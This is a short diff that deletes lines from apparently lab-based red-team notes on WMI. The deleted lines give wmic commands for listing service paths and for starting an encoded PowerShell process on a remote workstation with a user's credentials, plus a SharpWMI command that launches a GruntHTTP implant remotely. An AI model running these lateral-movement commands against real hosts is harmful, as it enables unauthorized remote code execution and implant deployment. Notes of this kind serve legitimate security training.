@@ -1,7 +1,0 @@
-- Get all service paths
-	- `wmic service get name, pathname`
-- Execute command on local or remote host
-	- `wmic /node:"wkstn-4945" /user:"cyberbotic.io\\n.lamb" /password:"REDACTED" process call create "powershell -enc \[...snip...\]"`
-- SharpWMI
-	- `SharpWMI /command:"action=exec computername=wkstn-4945 command=\\"C:\\Windows\\Temp\\GruntHTTP.exe\\""`
-- 
